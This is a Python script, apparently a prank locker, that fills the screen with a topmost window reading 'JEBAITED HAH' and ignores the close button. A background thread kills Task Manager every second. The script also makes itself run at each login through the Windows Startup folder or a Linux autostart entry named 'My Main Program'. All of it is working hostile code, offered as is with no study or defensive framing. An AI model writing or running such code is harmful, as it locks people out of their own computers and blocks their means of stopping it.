import tkinter as tk
import subprocess
import psutil
import time
import threading
import os
import sys

def main():
    root = tk.Tk()
    root.attributes('-topmost', True)  
    root.attributes('-fullscreen', True)
    root.configure(bg='black')

    label = tk.Label(root, text="JEBAITED HAH", font=('Helvetica', 48), fg='white', bg='black')
    label.pack(expand=True)

    def on_close():
        pass  

    root.protocol("WM_DELETE_WINDOW", on_close)

    
    def game():
        while True:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() in ['taskmgr.exe', 'taskmgr']:
                    try:
                        proc.kill()
                        print("Task Manager process terminated.")
                    except Exception as e:
                        print(f"Error while terminating Task Manager process: {e}")
            time.sleep(1)

    
    task_manager_thread = threading.Thread(target=game, daemon=True)
    task_manager_thread.start()

    root.mainloop()

def virtual_room():
    import shutil
    import getpass

    
    batch_file = os.path.join(os.path.dirname(__file__), "start_main.bat")

    
    username = getpass.getuser()
    startup_folder = os.path.join("C:\\Users", username, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

   
    if not os.path.exists(startup_folder):
        os.makedirs(startup_folder, exist_ok=True)
    
    shutil.copy(batch_file, startup_folder)
    print(f"Added {batch_file} to Windows startup.")

def add_to_startup_linux():
    desktop_entry = os.path.expanduser("~/.config/autostart/main.desktop")
    script_path = os.path.abspath(__file__)

    
    if not os.path.exists(desktop_entry):
        os.makedirs(os.path.dirname(desktop_entry), exist_ok=True)
        with open(desktop_entry, 'w') as f:
            f.write(f'''[Desktop Entry]
Type=Application
Name=My Main Program
Exec=python3 {script_path}
''')
        print(f"Added {script_path} to Linux startup.")
    else:
        print(f"{desktop_entry} already exists in Linux startup.")

def setup_autostart():
    if sys.platform.startswith('win'):
        virtual_room()
    elif sys.platform.startswith('linux'):
        add_to_startup_linux()

if __name__ == "__main__":
    setup_autostart()
    main()
